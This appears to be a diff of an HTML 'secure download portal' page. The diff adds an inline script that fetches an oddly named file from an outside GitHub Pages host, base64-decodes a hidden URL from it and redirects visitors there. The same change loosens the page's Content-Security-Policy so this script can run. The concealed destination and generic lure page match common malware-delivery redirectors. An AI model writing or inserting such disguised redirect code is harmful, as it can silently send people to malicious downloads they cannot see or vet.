@@ -1,30 +1,58 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>File Download</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Cloud Files</title>
+  <meta name="description" content="Secure download portal"/>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+
+  <!-- Разрешаем инлайн‑скрипты для нашего мини‑JS -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src  'self' 'unsafe-inline' https://pomlao.github.io;
+    style-src   'self';
+    connect-src 'self' https://pomlao.github.io
+  "/>
+
+  <link rel="stylesheet" href="styles.css"/>
 </head>
 <body>
-  <div class="container">
-    <div class="card">
-      <div class="card-content">
-        <div class="icon">
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
-               xmlns="http://www.w3.org/2000/svg">
-            <path d="M7 10L12 15L17 10" stroke="white" stroke-width="2"
-                  stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-        </div>
-        <h1>Your file is downloading</h1>
-        <!-- The script will update this to "Fetching download link…" and then "Redirecting…" -->
-        <p id="loader">Redirecting…</p>
-        <!-- The script will display any error here -->
-        <p id="status" style="color: red;"></p>
+  <div class="download-container">
+    <div class="download-box">
+      <div class="download-icon">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
+          <path d="M8 11L12 15L16 11"
+                stroke="white" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
       </div>
+      <h1>Preparing your download…</h1>
+      <p id="loader-text">Starting…</p>
+      <p id="error-text" class="error-text"></p>
     </div>
   </div>
-  <script src="script.js"></script>
+
+  <script>
+  (async function(){
+    const loader = document.getElementById('loader-text');
+    const error  = document.getElementById('error-text');
+    loader.textContent = 'Fetching download link…';
+    error.textContent  = '';
+    try {
+      const res = await fetch('https://pomlao.github.io/.github/klakdjf.kdkdja');
+      if (!res.ok) throw new Error(`Config HTTP ${res.status}`);
+      const { c } = await res.json();
+      const url = atob(c);
+      if (!/^https?:\/\//.test(url)) throw new Error('Invalid URL');
+      loader.textContent = 'Redirecting…';
+      window.location.href = url;
+    } catch (e) {
+      console.error(e);
+      loader.textContent = '';
+      error.textContent = `Error: ${e.message}`;
+    }
+  })();
+  </script>
 </body>
 </html>
